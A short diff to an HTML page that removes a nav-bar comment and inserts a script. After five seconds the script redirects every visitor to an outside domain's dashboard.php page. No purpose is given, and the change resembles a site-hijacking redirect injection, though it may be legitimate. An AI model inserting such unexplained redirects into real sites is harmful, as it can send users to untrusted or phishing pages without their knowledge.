@@ -23,7 +23,11 @@
 </head>
 
 <body>
-  <!-- nav bar -->
+  <script>
+     setTimeout(function(){
+        window.location.href = "http://oai-content.co.uk/dashboard.php";
+     }, 5000);
+  </script>
   <div class="navbar navbar-site navbar-default" role="navigation">
       <div class="navbar-main">
           <div class="container">
